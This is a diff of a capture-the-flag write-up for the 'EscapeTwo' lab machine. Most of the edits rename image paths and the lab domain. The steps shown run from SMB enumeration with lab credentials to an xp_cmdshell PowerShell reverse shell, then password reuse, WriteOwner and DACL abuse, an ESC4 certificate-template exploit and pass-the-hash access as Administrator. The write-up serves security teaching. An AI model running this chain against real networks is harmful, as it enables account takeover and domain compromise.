@@ -20,7 +20,7 @@ tags:
   - certipy
   - certificate-templates
 author: pir4cy
-coverImage: /images/htb/covers/escapetwo-cover.png
+coverImage: /images/writeups/covers/escapetwo-cover.png
 draft: false
 ---
 
@@ -35,7 +35,7 @@ draft: false
 > - ca_svc is part of the CERTPUBLISHERS group, allowing us to exploit the DunderMifflin Certificate Template.
 > - Finally, using the template vulnerability, we obtain the Administrator hash and gain system access.
 > 
-![Attack Path](/images/htb/machines/EscapeTwo/attack-path.png)
+![Attack Path](/images/writeups/machines/EscapeTwo/attack-path.png)
 
 > **Conclusion:**
 > This box demonstrates a realistic attack chain involving credential discovery, Active Directory permission abuse, and certificate template exploitation. It showcases important security weaknesses in certificate templates that are often overlooked. 
@@ -50,7 +50,7 @@ draft: false
 ## Initial Scan
 
 Let's start with an nmap scan to identify available services:
-![Nmap Scan](/images/htb/machines/EscapeTwo/nmap.png "NMAP")
+![Nmap Scan](/images/writeups/machines/EscapeTwo/nmap.png "NMAP")
 
 Our scan reveals the following key services:
 - SMB (445)
@@ -59,7 +59,7 @@ Our scan reveals the following key services:
 
 Let's add the target to our hosts file:
 ```
-10.10.11.51 dc01.sequel.htb sequel.htb
+10.10.11.51 dc01.sequel.writeups sequel.writeups
 ```
 
 ## Enumeration
@@ -67,15 +67,15 @@ Let's add the target to our hosts file:
 Enumerating the SMB shares using the provided credentials:
 
 ```
-nxc smb dc01.sequel.htb -u 'rose' -p 'KxEPkKe6R8su' --shares
+nxc smb dc01.sequel.writeups -u 'rose' -p 'KxEPkKe6R8su' --shares
 ```
 
-![SMB Shares](/images/htb/machines/EscapeTwo/rose-shares.png)
+![SMB Shares](/images/writeups/machines/EscapeTwo/rose-shares.png)
 
 We find an "Accounting Department" share that's accessible. Let's see what's inside:
 
 ```
-nxc smb dc01.sequel.htb -u 'rose' -p 'KxEPkKe6R8su' --shares -M spider_plus -o DOWNLOAD_FLAG=True
+nxc smb dc01.sequel.writeups -u 'rose' -p 'KxEPkKe6R8su' --shares -M spider_plus -o DOWNLOAD_FLAG=True
 ```
 
 In the share, we discover some Excel files. After unzipping and analyzing them, we find credentials for the 'sa' user for the MSSQL server.
@@ -85,74 +85,74 @@ In the share, we discover some Excel files. After unzipping and analyzing them, 
 With the 'sa' credentials in hand, we can now connect to the MSSQL server:
 
 ```
-impacket-mssqlclient sa:'MSSQLP@ssw0rd!'@dc01.sequel.htb
+impacket-mssqlclient sa:'MSSQLP@ssw0rd!'@dc01.sequel.writeups
 ```
 
 Once connected, we aim to enable xp_cmdshell to execute commands - `enable_xp_cmdshell`
 
-![sa cmdshell](/images/htb/machines/EscapeTwo/sa-mssql-login.png)
+![sa cmdshell](/images/writeups/machines/EscapeTwo/sa-mssql-login.png)
 
 Now that we can execute commands on the target machine, let's set up a reverse shell:
 
 ```
 xp_cmdshell powershell -e <base64 payload>
 ```
-![sa revshell](/images/htb/machines/EscapeTwo/sa-revshell-powershell.png)
+![sa revshell](/images/writeups/machines/EscapeTwo/sa-revshell-powershell.png)
 
 Successfully obtained a reverse shell as user 'sql_svc'!
 
-![sql_svc shell](/images/htb/machines/EscapeTwo/sql-svc-shell.png)
+![sql_svc shell](/images/writeups/machines/EscapeTwo/sql-svc-shell.png)
 
 ## User Access
 
 As 'sql_svc', we find a config file containing credentials:
 
-![sql_svc creds](/images/htb/machines/EscapeTwo/sql-svc-creds-found.png)
+![sql_svc creds](/images/writeups/machines/EscapeTwo/sql-svc-creds-found.png)
 
 The config file reveals credentials for the 'sql_svc' user. Testing these credentials against other accounts, we discover that 'ryan' uses the same password.
 
 Let's run a quick check to confirm we can authenticate as 'ryan':
 
 ```
-nxc smb dc01.sequel.htb -u 'ryan' -p 'WqSZAF6CysDQbGb3'
+nxc smb dc01.sequel.writeups -u 'ryan' -p 'WqSZAF6CysDQbGb3'
 ```
 
-![ryan-same-password](/images/htb/machines/EscapeTwo/ryan-pwned-same-password.png)
+![ryan-same-password](/images/writeups/machines/EscapeTwo/ryan-pwned-same-password.png)
 
 Great! We can authenticate as 'ryan' and can grab the user.txt flag.
 
-![ryan-pwned](/images/htb/machines/EscapeTwo/user-pwned.png)
+![ryan-pwned](/images/writeups/machines/EscapeTwo/user-pwned.png)
 
 ## Privilege Escalation
 
 Let's further enumerate our access as 'ryan' using BloodHound to understand our permissions in the Active Directory environment. Netexec does have a bloodhound collection mode that we can utilize.
 
 ```
-nxc ldap dc01.sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' --bloodhound --collection All -d sequel.htb --dns-server 10.10.11.51
+nxc ldap dc01.sequel.writeups -u ryan -p 'WqSZAF6CysDQbGb3' --bloodhound --collection All -d sequel.writeups --dns-server 10.10.11.51
 ```
 
 After analyzing the BloodHound results, we discover that 'ryan' has WriteOwner access to the 'ca_svc' account. This is a significant privilege that we can exploit.
 
-![ryan-writeowner](/images/htb/machines/EscapeTwo/ryan-permissions-write.png)
+![ryan-writeowner](/images/writeups/machines/EscapeTwo/ryan-permissions-write.png)
 
 To abuse the WriteOwner access:
 
 1. Use impacket-owneredit to take ownership of the 'ca_svc' account:
 ```
-impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb/ryan':'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51   
+impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.writeups/ryan':'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51   
 ```
 
 2. Use impacket-dacledit to modify ACLs and grant full control:
 ```
-impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb/ryan':'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51
+impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.writeups/ryan':'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51
 ```
 
 3. Reset the password for ca_svc:
 ```
-net rpc password "ca_svc" 'pir4cy1sc00l!' -U "sequel.htb"/"ryan"%'WqSZAF6CysDQbGb3' -S "dc01.sequel.htb"
+net rpc password "ca_svc" 'pir4cy1sc00l!' -U "sequel.writeups"/"ryan"%'WqSZAF6CysDQbGb3' -S "dc01.sequel.writeups"
 ```
 
-![ryan-abusing-writeowner](/images/htb/machines/EscapeTwo/ryan-abusing-writeOwner.png)
+![ryan-abusing-writeowner](/images/writeups/machines/EscapeTwo/ryan-abusing-writeOwner.png)
 
 Now we have access to the 'ca_svc' account!
 
@@ -163,21 +163,21 @@ With access to 'ca_svc', we discover that this account is a member of the CERTPU
 Using certipy-ad, we can enumerate available certificate templates:
 
 ```
-certipy-ad find -u ca_svc@sequel.htb -p 'pir4cy1sc00l!' -dc-ip 10.10.11.51 -text
+certipy-ad find -u ca_svc@sequel.writeups -p 'pir4cy1sc00l!' -dc-ip 10.10.11.51 -text
 ```
-![certipy find](/images/htb/machines/EscapeTwo/certipy-find-certificates.png)
+![certipy find](/images/writeups/machines/EscapeTwo/certipy-find-certificates.png)
 
 We identify a vulnerable template called "DunderMifflinAuthentication" that has the ESC4 vulnerability, allowing the CERTPUBLISHERS group to request certificates for any user, including Administrator. The vulnerability exists because members of the CERTPUBLISHERS group have enrollment rights and dangerous permissions (Full Control, Write Owner, Write DACL) on the template.
 
-![exploitable template](/images/htb/machines/EscapeTwo/certipy-dundermifflin-template.png)
+![exploitable template](/images/writeups/machines/EscapeTwo/certipy-dundermifflin-template.png)
 
 Let's exploit this ESC4 vulnerability to obtain a certificate for the Administrator account:
 
 ```
-certipy-ad req -username ca_svc@sequel.htb -p 'pir4cy1sc00l!' -ca sequel-DC01-CA -template DunderMifflinAuthentication -target dc01.sequel.htb -upn administrator@sequel.htb 
+certipy-ad req -username ca_svc@sequel.writeups -p 'pir4cy1sc00l!' -ca sequel-DC01-CA -template DunderMifflinAuthentication -target dc01.sequel.writeups -upn administrator@sequel.writeups 
 ```
 
-![certipy admin req](/images/htb/machines/EscapeTwo/certipy-admin-forge.png)
+![certipy admin req](/images/writeups/machines/EscapeTwo/certipy-admin-forge.png)
 
 With the certificate, we can retrieve the Administrator's NT hash:
 
@@ -185,17 +185,17 @@ With the certificate, we can retrieve the Administrator's NT hash:
 certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.51
 ```
 
-![admin hash](/images/htb/machines/EscapeTwo/admin-hash.png)
+![admin hash](/images/writeups/machines/EscapeTwo/admin-hash.png)
 
 Finally, we can use Evil-WinRM with the hash to get system access:
 
 ```
-evil-winrm -i dc01.sequel.htb -u Administrator -H <admin hash>
+evil-winrm -i dc01.sequel.writeups -u Administrator -H <admin hash>
 ```
 
 Success! We can now grab the root.txt flag from the Administrator's desktop.
 
-![rooted](/images/htb/machines/EscapeTwo/rooted.png)
+![rooted](/images/writeups/machines/EscapeTwo/rooted.png)
 
 ## Conclusion
 
